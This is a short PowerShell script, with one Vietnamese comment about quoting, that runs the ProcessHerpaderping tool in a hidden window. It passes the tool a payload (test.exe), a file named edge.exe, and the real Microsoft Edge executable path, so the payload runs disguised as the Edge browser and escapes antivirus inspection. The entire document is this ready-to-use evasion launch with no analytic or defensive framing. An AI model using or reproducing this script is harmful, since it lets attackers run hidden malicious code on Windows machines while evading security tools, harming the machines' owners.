$exe = ".\ProcessHerpaderping.exe"
$payload = ".\test.exe"
$target = "edge.exe"
$realPath = "'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'"

# Cách dùng dấu ngoặc đơn lồng trong dấu ngoặc kép chuẩn:
$action = "-WindowStyle Hidden -Command & { $exe $payload $target $realPath }"
Start-Process powershell.exe -ArgumentList $action